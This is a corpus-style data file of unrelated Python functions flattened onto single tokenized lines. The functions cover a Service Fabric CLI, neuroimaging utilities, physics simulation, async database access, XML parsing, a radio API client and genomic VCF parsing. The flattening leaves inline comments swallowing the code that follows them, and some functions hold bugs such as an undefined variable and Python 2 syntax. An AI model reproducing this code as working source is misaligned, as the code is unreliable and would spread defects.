def load_command_table ( self , args ) : #pylint: disable=too-many-statements # Need an empty client for the select and upload operations with CommandSuperGroup ( __name__ , self , 'rcctl.custom_cluster#{}' ) as super_group : with super_group . group ( 'cluster' ) as group : group . command ( 'select' , 'select' ) with CommandSuperGroup ( __name__ , self , 'rcctl.custom_reliablecollections#{}' , client_factory = client_create ) as super_group : with super_group . group ( 'dictionary' ) as group : group . command ( 'query' , 'query_reliabledictionary' ) group . command ( 'execute' , 'execute_reliabledictionary' ) group . command ( 'schema' , 'get_reliabledictionary_schema' ) group . command ( 'list' , 'get_reliabledictionary_list' ) group . command ( 'type-schema' , 'get_reliabledictionary_type_schema' ) with ArgumentsContext ( self , 'dictionary' ) as ac : ac . argument ( 'application_name' , options_list = [ '--application-name' , '-a' ] ) ac . argument ( 'service_name' , options_list = [ '--service-name' , '-s' ] ) ac . argument ( 'dictionary_name' , options_list = [ '--dictionary-name' , '-d' ] ) ac . argument ( 'output_file' , options_list = [ '--output-file' , '-out' ] ) ac . argument ( 'input_file' , options_list = [ '--input-file' , '-in' ] ) ac . argument ( 'query_string' , options_list = [ '--query-string' , '-q' ] ) ac . argument ( 'type_name' , options_list = [ '--type-name' , '-t' ] ) return OrderedDict ( self . command_table )
def div_img ( img1 , div2 ) : if is_img ( div2 ) : return img1 . get_data ( ) / div2 . get_data ( ) elif isinstance ( div2 , ( float , int ) ) : return img1 . get_data ( ) / div2 else : raise NotImplementedError ( 'Cannot divide {}({}) by ' '{}({})' . format ( type ( img1 ) , img1 , type ( div2 ) , div2 ) )
def apply_mask ( img , mask ) : from . mask import apply_mask vol , _ = apply_mask ( img , mask ) return vector_to_volume ( vol , read_img ( mask ) . get_data ( ) . astype ( bool ) )
def abs_img ( img ) : bool_img = np . abs ( read_img ( img ) . get_data ( ) ) return bool_img . astype ( int )
def spatial_map ( icc , thr , mode = '+' ) : return thr_img ( icc_img_to_zscore ( icc ) , thr = thr , mode = mode ) . get_data ( )
def smooth_fwhm ( self , fwhm ) : if fwhm != self . _smooth_fwhm : self . _is_data_smooth = False self . _smooth_fwhm = fwhm
def setup_logging ( log_config_file = op . join ( op . dirname ( __file__ ) , 'logger.yml' ) , log_default_level = LOG_LEVEL , env_key = MODULE_NAME . upper ( ) + '_LOG_CFG' ) : path = log_config_file value = os . getenv ( env_key , None ) if value : path = value if op . exists ( path ) : log_cfg = yaml . load ( read ( path ) . format ( MODULE_NAME ) ) logging . config . dictConfig ( log_cfg ) #print('Started logging using config file {0}.'.format(path)) else : logging . basicConfig ( level = log_default_level ) #print('Started default logging. Could not find config file ' #      'in {0}.'.format(path)) log = logging . getLogger ( __name__ ) log . debug ( 'Start logging.' )
def select_arg_verify ( endpoint , cert , key , pem , ca , aad , no_verify ) : #pylint: disable=invalid-name,too-many-arguments if not ( endpoint . lower ( ) . startswith ( 'http' ) or endpoint . lower ( ) . startswith ( 'https' ) ) : raise CLIError ( 'Endpoint must be HTTP or HTTPS' ) usage = ( 'Valid syntax : --endpoint [ [ --key --cert | --pem | --aad] ' '[ --ca | --no-verify ] ]' ) if ca and not ( pem or all ( [ key , cert ] ) ) : raise CLIError ( usage ) if no_verify and not ( pem or all ( [ key , cert ] ) or aad ) : raise CLIError ( usage ) if no_verify and ca : raise CLIError ( usage ) if any ( [ cert , key ] ) and not all ( [ cert , key ] ) : raise CLIError ( usage ) if aad and any ( [ pem , cert , key ] ) : raise CLIError ( usage ) if pem and any ( [ cert , key ] ) : raise CLIError ( usage )
def _openpyxl_read_xl ( xl_path : str ) : try : wb = load_workbook ( filename = xl_path , read_only = True ) except : raise else : return wb
def read_xl ( xl_path : str ) : xl_path , choice = _check_xl_path ( xl_path ) reader = XL_READERS [ choice ] return reader ( xl_path )
def col_values ( df , col_name ) : _check_cols ( df , [ col_name ] ) if 'O' in df [ col_name ] or pd . np . issubdtype ( df [ col_name ] . dtype , str ) : # if the column is of strings return [ nom . lower ( ) for nom in df [ pd . notnull ( df ) ] [ col_name ] if not pd . isnull ( nom ) ] else : return [ nom for nom in df [ pd . notnull ( df ) ] [ col_name ] if not pd . isnull ( nom ) ]
def duplicated ( values : Sequence ) : vals = pd . Series ( values ) return vals [ vals . duplicated ( ) ]
def repr_imgs ( imgs ) : if isinstance ( imgs , string_types ) : return imgs if isinstance ( imgs , collections . Iterable ) : return '[{}]' . format ( ', ' . join ( repr_imgs ( img ) for img in imgs ) ) # try get_filename try : filename = imgs . get_filename ( ) if filename is not None : img_str = "{}('{}')" . format ( imgs . __class__ . __name__ , filename ) else : img_str = "{}(shape={}, affine={})" . format ( imgs . __class__ . __name__ , repr ( get_shape ( imgs ) ) , repr ( imgs . get_affine ( ) ) ) except Exception as exc : log . error ( 'Error reading attributes from img.get_filename()' ) return repr ( imgs ) else : return img_str
def get_config_bool ( name ) : cli_config = CLIConfig ( SF_CLI_CONFIG_DIR , SF_CLI_ENV_VAR_PREFIX ) return cli_config . getboolean ( 'servicefabric' , name , False )
def set_config_value ( name , value ) : cli_config = CLIConfig ( SF_CLI_CONFIG_DIR , SF_CLI_ENV_VAR_PREFIX ) cli_config . set_value ( 'servicefabric' , name , value )
def set_aad_cache ( token , cache ) : set_config_value ( 'aad_token' , jsonpickle . encode ( token ) ) set_config_value ( 'aad_cache' , jsonpickle . encode ( cache ) )
def set_aad_metadata ( uri , resource , client ) : set_config_value ( 'authority_uri' , uri ) set_config_value ( 'aad_resource' , resource ) set_config_value ( 'aad_client' , client )
def set_auth ( pem = None , cert = None , key = None , aad = False ) : if any ( [ cert , key ] ) and pem : raise ValueError ( 'Cannot specify both pem and cert or key' ) if any ( [ cert , key ] ) and not all ( [ cert , key ] ) : raise ValueError ( 'Must specify both cert and key' ) if pem : set_config_value ( 'security' , 'pem' ) set_config_value ( 'pem_path' , pem ) elif cert or key : set_config_value ( 'security' , 'cert' ) set_config_value ( 'cert_path' , cert ) set_config_value ( 'key_path' , key ) elif aad : set_config_value ( 'security' , 'aad' ) else : set_config_value ( 'security' , 'none' )
def dictify ( a_named_tuple ) : return dict ( ( s , getattr ( a_named_tuple , s ) ) for s in a_named_tuple . _fields )
def create ( _ ) : endpoint = client_endpoint ( ) if not endpoint : raise CLIError ( "Connection endpoint not found. " "Before running sfctl commands, connect to a cluster using " "the 'sfctl cluster select' command." ) no_verify = no_verify_setting ( ) if security_type ( ) == 'aad' : auth = AdalAuthentication ( no_verify ) else : cert = cert_info ( ) ca_cert = ca_cert_info ( ) auth = ClientCertAuthentication ( cert , ca_cert , no_verify ) return ServiceFabricClientAPIs ( auth , base_url = endpoint )
def _escape_char ( c , escape_char = ESCAPE_CHAR ) : buf = [ ] for byte in c . encode ( 'utf8' ) : buf . append ( escape_char ) buf . append ( '%X' % _ord ( byte ) ) return '' . join ( buf )
def copy_attributes ( source , destination , ignore_patterns = [ ] ) : for attr in _wildcard_filter ( dir ( source ) , * ignore_patterns ) : setattr ( destination , attr , getattr ( source , attr ) )
def query ( self , input = '' , params = { } ) : # Get and construct query parameters # Default parameters payload = { 'input' : input , 'appid' : self . appid } # Additional parameters (from params), formatted for url for key , value in params . items ( ) : # Check if value is list or tuple type (needs to be comma joined) if isinstance ( value , ( list , tuple ) ) : payload [ key ] = ',' . join ( value ) else : payload [ key ] = value # Catch any issues with connecting to Wolfram Alpha API try : r = requests . get ( "http://api.wolframalpha.com/v2/query" , params = payload ) # Raise Exception (to be returned as error) if r . status_code != 200 : raise Exception ( 'Invalid response status code: %s' % ( r . status_code ) ) if r . encoding != 'utf-8' : raise Exception ( 'Invalid encoding: %s' % ( r . encoding ) ) except Exception , e : return Result ( error = e ) return Result ( xml = r . text )
def pods ( self ) : # Return empty list if xml_tree is not defined (error Result object) if not self . xml_tree : return [ ] # Create a Pod object for every pod group in xml return [ Pod ( elem ) for elem in self . xml_tree . findall ( 'pod' ) ]
def _get_params ( target , param , dof ) : return [ target . getParam ( getattr ( ode , 'Param{}{}' . format ( param , s ) ) ) for s in [ '' , '2' , '3' ] [ : dof ] ]
def _set_params ( target , param , values , dof ) : if not isinstance ( values , ( list , tuple , np . ndarray ) ) : values = [ values ] * dof assert dof == len ( values ) for s , value in zip ( [ '' , '2' , '3' ] [ : dof ] , values ) : target . setParam ( getattr ( ode , 'Param{}{}' . format ( param , s ) ) , value )
def make_quaternion ( theta , * axis ) : x , y , z = axis r = np . sqrt ( x * x + y * y + z * z ) st = np . sin ( theta / 2. ) ct = np . cos ( theta / 2. ) return [ x * st / r , y * st / r , z * st / r , ct ]
def center_of_mass ( bodies ) : x = np . zeros ( 3. ) t = 0. for b in bodies : m = b . mass x += b . body_to_world ( m . c ) * m . mass t += m . mass return x / t
def positions ( self ) : return [ self . ode_obj . getPosition ( i ) for i in range ( self . LDOF ) ]
def position_rates ( self ) : return [ self . ode_obj . getPositionRate ( i ) for i in range ( self . LDOF ) ]
def angles ( self ) : return [ self . ode_obj . getAngle ( i ) for i in range ( self . ADOF ) ]
def angle_rates ( self ) : return [ self . ode_obj . getAngleRate ( i ) for i in range ( self . ADOF ) ]
def axes ( self ) : return [ np . array ( self . ode_obj . getAxis ( i ) ) for i in range ( self . ADOF or self . LDOF ) ]
def axes ( self ) : return [ np . array ( self . ode_obj . getAxis1 ( ) ) , np . array ( self . ode_obj . getAxis2 ( ) ) ]
def create_bodies ( self , translate = ( 0 , 1 , 0 ) , size = 0.1 ) : stack = [ ( 'root' , 0 , self . root [ 'position' ] + translate ) ] while stack : name , depth , end = stack . pop ( ) for child in self . hierarchy . get ( name , ( ) ) : stack . append ( ( child , depth + 1 , end + self . bones [ child ] . end ) ) if name not in self . bones : continue bone = self . bones [ name ] body = self . world . create_body ( 'box' , name = bone . name , density = self . density , lengths = ( size , size , bone . length ) ) body . color = self . color # move the center of the body to the halfway point between # the parent (joint) and child (joint). x , y , z = end - bone . direction * bone . length / 2 # swizzle y and z -- asf uses y as up, but we use z as up. body . position = x , z , y # compute an orthonormal (rotation) matrix using the ground and # the body. this is mind-bending but seems to work. u = bone . direction v = np . cross ( u , [ 0 , 1 , 0 ] ) l = np . linalg . norm ( v ) if l > 0 : v /= l rot = np . vstack ( [ np . cross ( u , v ) , v , u ] ) . T swizzle = [ [ 1 , 0 , 0 ] , [ 0 , 0 , 1 ] , [ 0 , - 1 , 0 ] ] body . rotation = np . dot ( swizzle , rot ) self . bodies . append ( body )
def create_joints ( self ) : stack = [ 'root' ] while stack : parent = stack . pop ( ) for child in self . hierarchy . get ( parent , ( ) ) : stack . append ( child ) if parent not in self . bones : continue bone = self . bones [ parent ] body = [ b for b in self . bodies if b . name == parent ] [ 0 ] for child in self . hierarchy . get ( parent , ( ) ) : child_bone = self . bones [ child ] child_body = [ b for b in self . bodies if b . name == child ] [ 0 ] shape = ( '' , 'hinge' , 'universal' , 'ball' ) [ len ( child_bone . dof ) ] self . joints . append ( self . world . join ( shape , body , child_body ) )
def joint_torques ( self ) : return as_flat_array ( getattr ( j , 'amotor' , j ) . feedback [ - 1 ] [ : j . ADOF ] for j in self . joints )
def labels ( self ) : return sorted ( self . channels , key = lambda c : self . channels [ c ] )
def process_data ( self ) : self . visibility = self . data [ : , : , 3 ] self . positions = self . data [ : , : , : 3 ] self . velocities = np . zeros_like ( self . positions ) + 1000 for frame_no in range ( 1 , len ( self . data ) - 1 ) : prev = self . data [ frame_no - 1 ] next = self . data [ frame_no + 1 ] for c in range ( self . num_markers ) : if - 1 < prev [ c , 3 ] < 100 and - 1 < next [ c , 3 ] < 100 : self . velocities [ frame_no , c ] = ( next [ c , : 3 ] - prev [ c , : 3 ] ) / ( 2 * self . world . dt ) self . cfms = np . zeros_like ( self . visibility ) + self . DEFAULT_CFM
def create_bodies ( self ) : self . bodies = { } for label in self . channels : body = self . world . create_body ( 'sphere' , name = 'marker:{}' . format ( label ) , radius = 0.02 ) body . is_kinematic = True body . color = 0.9 , 0.1 , 0.1 , 0.5 self . bodies [ label ] = body
def forward_dynamics ( self , torques , start = 0 , states = None ) : if states is not None : self . skeleton . set_body_states ( states ) for frame_no , torque in enumerate ( torques ) : if frame_no < start : continue if frame_no >= end : break self . ode_space . collide ( None , self . on_collision ) self . skeleton . add_torques ( torque ) self . ode_world . step ( self . dt ) yield self . ode_contactgroup . empty ( )
def render ( self , dt ) : for frame in self . _frozen : for body in frame : self . draw_body ( body ) for body in self . world . bodies : self . draw_body ( body ) if hasattr ( self . world , 'markers' ) : # draw line between anchor1 and anchor2 for marker joints. window . glColor4f ( 0.9 , 0.1 , 0.1 , 0.9 ) window . glLineWidth ( 3 ) for j in self . world . markers . joints . values ( ) : window . glBegin ( window . GL_LINES ) window . glVertex3f ( * j . getAnchor ( ) ) window . glVertex3f ( * j . getAnchor2 ( ) ) window . glEnd ( )
def response_status_string ( code ) : mean = HTTP_STATUS_CODES . get ( code , 'unknown' ) . upper ( ) return '{code} {mean}' . format ( code = code , mean = mean )
def fetch ( self ) : try : if not self . _last_message_id : messages = self . _connection . get ( "room/%s/recent" % self . _room_id , key = "messages" , parameters = { "limit" : 1 } ) self . _last_message_id = messages [ - 1 ] [ "id" ] messages = self . _connection . get ( "room/%s/recent" % self . _room_id , key = "messages" , parameters = { "since_message_id" : self . _last_message_id } ) except : messages = [ ] if messages : self . _last_message_id = messages [ - 1 ] [ "id" ] self . received ( messages )
def connectionMade ( self ) : headers = [ "GET %s HTTP/1.1" % ( "/room/%s/live.json" % self . factory . get_stream ( ) . get_room_id ( ) ) ] connection_headers = self . factory . get_stream ( ) . get_connection ( ) . get_headers ( ) for header in connection_headers : headers . append ( "%s: %s" % ( header , connection_headers [ header ] ) ) headers . append ( "Host: streaming.campfirenow.com" ) self . transport . write ( "\r\n" . join ( headers ) + "\r\n\r\n" ) self . factory . get_stream ( ) . set_protocol ( self )
def styles ( self ) : styles = get_all_styles ( ) whitelist = self . app . config . get ( 'CSL_STYLES_WHITELIST' ) if whitelist : return { k : v for k , v in styles . items ( ) if k in whitelist } return styles
def init_app ( self , app ) : state = _InvenioCSLRESTState ( app ) app . extensions [ 'invenio-csl-rest' ] = state return state
def _build_chunk_headers ( self ) : if hasattr ( self , "_chunk_headers" ) and self . _chunk_headers : return self . _chunk_headers = { } for field in self . _files : self . _chunk_headers [ field ] = self . _headers ( field , True ) for field in self . _data : self . _chunk_headers [ field ] = self . _headers ( field )
def _str_to_path ( s , result_type ) : assert isinstance ( s , str ) if isinstance ( s , bytes ) and result_type is text_type : return s . decode ( 'ascii' ) elif isinstance ( s , text_type ) and result_type is bytes : return s . encode ( 'ascii' ) return s
def _path_root ( draw , result_type ) : # Based on https://en.wikipedia.org/wiki/Path_(computing) def tp ( s = '' ) : return _str_to_path ( s , result_type ) if os . name != 'nt' : return tp ( os . sep ) sep = sampled_from ( [ os . sep , os . altsep or os . sep ] ) . map ( tp ) name = _filename ( result_type ) char = characters ( min_codepoint = ord ( "A" ) , max_codepoint = ord ( "z" ) ) . map ( lambda c : tp ( str ( c ) ) ) relative = sep # [drive_letter]:\ drive = builds ( lambda * x : tp ( ) . join ( x ) , char , just ( tp ( ':' ) ) , sep ) # \\?\[drive_spec]:\ extended = builds ( lambda * x : tp ( ) . join ( x ) , sep , sep , just ( tp ( '?' ) ) , sep , drive ) network = one_of ( [ # \\[server]\[sharename]\ builds ( lambda * x : tp ( ) . join ( x ) , sep , sep , name , sep , name , sep ) , # \\?\[server]\[sharename]\ builds ( lambda * x : tp ( ) . join ( x ) , sep , sep , just ( tp ( '?' ) ) , sep , name , sep , name , sep ) , # \\?\UNC\[server]\[sharename]\ builds ( lambda * x : tp ( ) . join ( x ) , sep , sep , just ( tp ( '?' ) ) , sep , just ( tp ( 'UNC' ) ) , sep , name , sep , name , sep ) , # \\.\[physical_device]\ builds ( lambda * x : tp ( ) . join ( x ) , sep , sep , just ( tp ( '.' ) ) , sep , name , sep ) , ] ) final = one_of ( relative , drive , extended , network ) return draw ( final )
def handle_extends ( self , text ) : match = self . re_extends . match ( text ) if match : extra_text = self . re_extends . sub ( '' , text , count = 1 ) blocks = self . get_blocks ( extra_text ) path = os . path . join ( self . base_dir , match . group ( 'path' ) ) with open ( path , encoding = 'utf-8' ) as fp : return self . replace_blocks_in_extends ( fp . read ( ) , blocks ) else : return None
def flush_buffer ( self ) : self . code_builder . add_line ( '{0}.extend([{1}])' , self . result_var , ',' . join ( self . buffered ) ) self . buffered = [ ]
def init_async ( self , loop = None ) : self . _loop = loop or asyncio . get_event_loop ( ) self . _async_lock = asyncio . Lock ( loop = loop ) # FIX: SQLITE in memory database if not self . database == ':memory:' : self . _state = ConnectionLocal ( )
async def async_connect ( self ) : if self . _async_lock is None : raise Exception ( 'Error, database not properly initialized before async connection' ) async with self . _async_lock : self . connect ( True ) return self . _state . conn
async def async_connect ( self ) : if self . _waiters is None : raise Exception ( 'Error, database not properly initialized before async connection' ) if self . _waiters or self . max_connections and ( len ( self . _in_use ) >= self . max_connections ) : waiter = asyncio . Future ( loop = self . _loop ) self . _waiters . append ( waiter ) try : logger . debug ( 'Wait for connection.' ) await waiter finally : self . _waiters . remove ( waiter ) self . connect ( ) return self . _state . conn
def generate ( request ) : models . DataItem . create ( content = '' . join ( random . choice ( string . ascii_uppercase + string . digits ) for _ in range ( 20 ) ) ) return muffin . HTTPFound ( '/' )
def scan ( xml ) : if xml . tag is et . Comment : yield { 'type' : COMMENT , 'text' : xml . text } return if xml . tag is et . PI : if xml . text : yield { 'type' : PI , 'target' : xml . target , 'text' : xml . text } else : yield { 'type' : PI , 'target' : xml . target } return obj = _elt2obj ( xml ) obj [ 'type' ] = ENTER yield obj assert type ( xml . tag ) is str , xml if xml . text : yield { 'type' : TEXT , 'text' : xml . text } for c in xml : for x in scan ( c ) : yield x if c . tail : yield { 'type' : TEXT , 'text' : c . tail } yield { 'type' : EXIT }
def unscan ( events , nsmap = None ) : root = None last_closed_elt = None stack = [ ] for obj in events : if obj [ 'type' ] == ENTER : elt = _obj2elt ( obj , nsmap = nsmap ) if stack : stack [ - 1 ] . append ( elt ) elif root is not None : raise RuntimeError ( 'Event stream tried to create second XML tree' ) else : root = elt stack . append ( elt ) last_closed_elt = None elif obj [ 'type' ] == EXIT : last_closed_elt = stack . pop ( ) elif obj [ 'type' ] == COMMENT : elt = et . Comment ( obj [ 'text' ] ) stack [ - 1 ] . append ( elt ) elif obj [ 'type' ] == PI : elt = et . PI ( obj [ 'target' ] ) if obj . get ( 'text' ) : elt . text = obj [ 'text' ] stack [ - 1 ] . append ( elt ) elif obj [ 'type' ] == TEXT : text = obj [ 'text' ] if text : if last_closed_elt is None : stack [ - 1 ] . text = ( stack [ - 1 ] . text or '' ) + text else : last_closed_elt . tail = ( last_closed_elt . tail or '' ) + text else : assert False , obj if root is None : raise RuntimeError ( 'Empty XML event stream' ) return root
def parse ( filename ) : for event , elt in et . iterparse ( filename , events = ( 'start' , 'end' , 'comment' , 'pi' ) , huge_tree = True ) : if event == 'start' : obj = _elt2obj ( elt ) obj [ 'type' ] = ENTER yield obj if elt . text : yield { 'type' : TEXT , 'text' : elt . text } elif event == 'end' : yield { 'type' : EXIT } if elt . tail : yield { 'type' : TEXT , 'text' : elt . tail } elt . clear ( ) elif event == 'comment' : yield { 'type' : COMMENT , 'text' : elt . text } elif event == 'pi' : yield { 'type' : PI , 'text' : elt . text } else : assert False , ( event , elt )
def subtree ( events ) : stack = 0 for obj in events : if obj [ 'type' ] == ENTER : stack += 1 elif obj [ 'type' ] == EXIT : if stack == 0 : break stack -= 1 yield obj
def merge_text ( events ) : text = [ ] for obj in events : if obj [ 'type' ] == TEXT : text . append ( obj [ 'text' ] ) else : if text : yield { 'type' : TEXT , 'text' : '' . join ( text ) } text . clear ( ) yield obj if text : yield { 'type' : TEXT , 'text' : '' . join ( text ) }
def setup ( self , app ) : # noqa super ( ) . setup ( app ) # Setup Database self . database . initialize ( connect ( self . cfg . connection , * * self . cfg . connection_params ) ) # Fix SQLite in-memory database if self . database . database == ':memory:' : self . cfg . connection_manual = True if not self . cfg . migrations_enabled : return # Setup migration engine self . router = Router ( self . database , migrate_dir = self . cfg . migrations_path ) # Register migration commands def pw_migrate ( name : str = None , fake : bool = False ) : self . router . run ( name , fake = fake ) self . app . manage . command ( pw_migrate ) def pw_rollback ( name : str = None ) : if not name : name = self . router . done [ - 1 ] self . router . rollback ( name ) self . app . manage . command ( pw_rollback ) def pw_create ( name : str = 'auto' , auto : bool = False ) : if auto : auto = list ( self . models . values ( ) ) self . router . create ( name , auto ) self . app . manage . command ( pw_create ) def pw_list ( ) : """List migrations.""" self . router . logger . info ( 'Migrations are done:' ) self . router . logger . info ( '\n' . join ( self . router . done ) ) self . router . logger . info ( '' ) self . router . logger . info ( 'Migrations are undone:' ) self . router . logger . info ( '\n' . join ( self . router . diff ) ) self . app . manage . command ( pw_list ) @ self . app . manage . command def pw_merge ( ) : """Merge migrations into one.""" self . router . merge ( ) self . app . manage . command ( pw_merge )
def startup ( self , app ) : self . database . init_async ( app . loop ) if not self . cfg . connection_manual : app . middlewares . insert ( 0 , self . _middleware )
def cleanup ( self , app ) : if hasattr ( self . database . obj , 'close_all' ) : self . database . close_all ( )
def register ( self , model ) : self . models [ model . _meta . table_name ] = model model . _meta . database = self . database return model
async def manage ( self ) : cm = _ContextManager ( self . database ) if isinstance ( self . database . obj , AIODatabase ) : cm . connection = await self . database . async_connect ( ) else : cm . connection = self . database . connect ( ) return cm
def not_followed_by ( parser ) : @ tri def not_followed_by_block ( ) : failed = object ( ) result = optional ( tri ( parser ) , failed ) if result != failed : fail ( [ "not " + _fun_to_str ( parser ) ] ) choice ( not_followed_by_block )
def many_until1 ( these , term ) : first = [ these ( ) ] these_results , term_result = many_until ( these , term ) return ( first + these_results , term_result )
def sep1 ( parser , separator ) : first = [ parser ( ) ] def inner ( ) : separator ( ) return parser ( ) return first + many ( tri ( inner ) )
def _fill ( self , size ) : try : for i in range ( size ) : self . buffer . append ( self . source . next ( ) ) except StopIteration : self . buffer . append ( ( EndOfFile , EndOfFile ) ) self . len = len ( self . buffer )
def next ( self ) : self . index += 1 t = self . peek ( ) if not self . depth : self . _cut ( ) return t
def field_type ( self ) : if not self . model : return 'JSON' database = self . model . _meta . database if isinstance ( database , Proxy ) : database = database . obj if Json and isinstance ( database , PostgresqlDatabase ) : return 'JSON' return 'TEXT'
def python_value ( self , value ) : if self . field_type == 'TEXT' and isinstance ( value , str ) : return self . loads ( value ) return value
def get_fsapi_endpoint ( self ) : endpoint = yield from self . __session . get ( self . fsapi_device_url , timeout = self . timeout ) text = yield from endpoint . text ( encoding = 'utf-8' ) doc = objectify . fromstring ( text ) return doc . webfsapi . text
def create_session ( self ) : req_url = '%s/%s' % ( self . __webfsapi , 'CREATE_SESSION' ) sid = yield from self . __session . get ( req_url , params = dict ( pin = self . pin ) , timeout = self . timeout ) text = yield from sid . text ( encoding = 'utf-8' ) doc = objectify . fromstring ( text ) return doc . sessionId . text
def call ( self , path , extra = None ) : try : if not self . __webfsapi : self . __webfsapi = yield from self . get_fsapi_endpoint ( ) if not self . sid : self . sid = yield from self . create_session ( ) if not isinstance ( extra , dict ) : extra = dict ( ) params = dict ( pin = self . pin , sid = self . sid ) params . update ( * * extra ) req_url = ( '%s/%s' % ( self . __webfsapi , path ) ) result = yield from self . __session . get ( req_url , params = params , timeout = self . timeout ) if result . status == 200 : text = yield from result . text ( encoding = 'utf-8' ) else : self . sid = yield from self . create_session ( ) params = dict ( pin = self . pin , sid = self . sid ) params . update ( * * extra ) result = yield from self . __session . get ( req_url , params = params , timeout = self . timeout ) text = yield from result . text ( encoding = 'utf-8' ) return objectify . fromstring ( text ) except Exception as e : logging . info ( 'AFSAPI Exception: ' + traceback . format_exc ( ) ) return None
def handle_set ( self , item , value ) : doc = yield from self . call ( 'SET/{}' . format ( item ) , dict ( value = value ) ) if doc is None : return None return doc . status == 'FS_OK'
def handle_text ( self , item ) : doc = yield from self . handle_get ( item ) if doc is None : return None return doc . value . c8_array . text or None
def handle_int ( self , item ) : doc = yield from self . handle_get ( item ) if doc is None : return None return int ( doc . value . u8 . text ) or None
def handle_long ( self , item ) : doc = yield from self . handle_get ( item ) if doc is None : return None return int ( doc . value . u32 . text ) or None
def get_power ( self ) : power = ( yield from self . handle_int ( self . API . get ( 'power' ) ) ) return bool ( power )
def set_power ( self , value = False ) : power = ( yield from self . handle_set ( self . API . get ( 'power' ) , int ( value ) ) ) return bool ( power )
def get_modes ( self ) : if not self . __modes : self . __modes = yield from self . handle_list ( self . API . get ( 'valid_modes' ) ) return self . __modes
def get_mode_list ( self ) : self . __modes = yield from self . get_modes ( ) return ( yield from self . collect_labels ( self . __modes ) )
def get_volume_steps ( self ) : if not self . __volume_steps : self . __volume_steps = yield from self . handle_int ( self . API . get ( 'volume_steps' ) ) return self . __volume_steps
def get_mute ( self ) : mute = ( yield from self . handle_int ( self . API . get ( 'mute' ) ) ) return bool ( mute )
def set_mute ( self , value = False ) : mute = ( yield from self . handle_set ( self . API . get ( 'mute' ) , int ( value ) ) ) return bool ( mute )
def get_play_status ( self ) : status = yield from self . handle_int ( self . API . get ( 'status' ) ) return self . PLAY_STATES . get ( status )
def get_equalisers ( self ) : if not self . __equalisers : self . __equalisers = yield from self . handle_list ( self . API . get ( 'equalisers' ) ) return self . __equalisers
def get_equaliser_list ( self ) : self . __equalisers = yield from self . get_equalisers ( ) return ( yield from self . collect_labels ( self . __equalisers ) )
def set_sleep ( self , value = False ) : return ( yield from self . handle_set ( self . API . get ( 'sleep' ) , int ( value ) ) )
def _parse_genotype ( self , vcf_fields ) : format_col = vcf_fields [ 8 ] . split ( ':' ) genome_data = vcf_fields [ 9 ] . split ( ':' ) try : gt_idx = format_col . index ( 'GT' ) except ValueError : return [ ] return [ int ( x ) for x in re . split ( r'[\|/]' , genome_data [ gt_idx ] ) if x != '.' ]
def objHasUnsavedChanges ( self ) : if not self . obj : return False return self . obj . hasUnsavedChanges ( cascadeObjects = True )
def items ( self ) : if self . meta_type == 'list' : return self . _list elif self . meta_type == 'dict' : return self . _dict . items ( )
def values ( self ) : if self . meta_type == 'list' : return self . _list elif self . meta_type == 'dict' : return self . _dict . values ( )
def append ( self , item ) : if self . meta_type == 'dict' : raise AssertionError ( 'Cannot append to object of `dict` base type!' ) if self . meta_type == 'list' : self . _list . append ( item ) return
def extend ( self , item ) : if self . meta_type == 'dict' : raise AssertionError ( 'Cannot extend to object of `dict` base type!' ) if self . meta_type == 'list' : self . _list . extend ( item ) return
def json ( self ) : if self . meta_type == 'list' : ret = [ ] for dat in self . _list : if not isinstance ( dat , composite ) : ret . append ( dat ) else : ret . append ( dat . json ( ) ) return ret elif self . meta_type == 'dict' : ret = { } for key in self . _dict : if not isinstance ( self . _dict [ key ] , composite ) : ret [ key ] = self . _dict [ key ] else : ret [ key ] = self . _dict [ key ] . json ( ) return ret
def json ( self ) : data = { } for item in self . _data : if isinstance ( self . _data [ item ] , filetree ) : data [ item ] = self . _data [ item ] . json ( ) else : data [ item ] = self . _data [ item ] return data
def filelist ( self ) : if len ( self . _filelist ) == 0 : for item in self . _data : if isinstance ( self . _data [ item ] , filetree ) : self . _filelist . extend ( self . _data [ item ] . filelist ( ) ) else : self . _filelist . append ( self . _data [ item ] ) return self . _filelist
def save ( self ) : if len ( self ) == 0 : return [ ] mdl = self . getModel ( ) return mdl . saver . save ( self )
def render ( self , * args , * * kwargs ) : render_to = StringIO ( ) self . output ( render_to , * args , * * kwargs ) return render_to . getvalue ( )
def start_tag ( self ) : direct_attributes = ( attribute . render ( self ) for attribute in self . render_attributes ) attributes = ( ) if hasattr ( self , '_attributes' ) : attributes = ( '{0}="{1}"' . format ( key , value ) for key , value in self . attributes . items ( ) if value ) rendered_attributes = " " . join ( filter ( bool , chain ( direct_attributes , attributes ) ) ) return '<{0}{1}{2}{3}>' . format ( self . tag , ' ' if rendered_attributes else '' , rendered_attributes , ' /' if self . tag_self_closes else "" )
def output ( self , to = None , formatted = False , * args , * * kwargs ) : to . write ( '<!DOCTYPE {0}>' . format ( self . type ) )
def as_dict ( self ) : self_as_dict = dict ( ) self_as_dict [ 'sequence' ] = self . sequence if hasattr ( self , 'frequency' ) : self_as_dict [ 'frequency' ] = self . frequency return self_as_dict
def _parse_allele_data ( self ) : return [ Allele ( sequence = x ) for x in [ self . ref_allele ] + self . alt_alleles ]
def _parse_info ( self , info_field ) : info = dict ( ) for item in info_field . split ( ';' ) : # Info fields may be "foo=bar" or just "foo". # For the first case, store key "foo" with value "bar" # For the second case, store key "foo" with value True. info_item_data = item . split ( '=' ) # If length is one, just store as a key with value = true. if len ( info_item_data ) == 1 : info [ info_item_data [ 0 ] ] = True elif len ( info_item_data ) == 2 : info [ info_item_data [ 0 ] ] = info_item_data [ 1 ] return info
def as_dict ( self ) : self_as_dict = { 'chrom' : self . chrom , 'start' : self . start , 'ref_allele' : self . ref_allele , 'alt_alleles' : self . alt_alleles , 'alleles' : [ x . as_dict ( ) for x in self . alleles ] } try : self_as_dict [ 'info' ] = self . info except AttributeError : pass return self_as_dict
def as_dict ( self , * args , * * kwargs ) : self_as_dict = super ( ClinVarAllele , self ) . as_dict ( * args , * * kwargs ) self_as_dict [ 'hgvs' ] = self . hgvs self_as_dict [ 'clnalleleid' ] = self . clnalleleid self_as_dict [ 'clnsig' ] = self . clnsig self_as_dict [ 'clndn' ] = self . clndn self_as_dict [ 'clndisdb' ] = self . clndisdb self_as_dict [ 'clnvi' ] = self . clnvi return self_as_dict
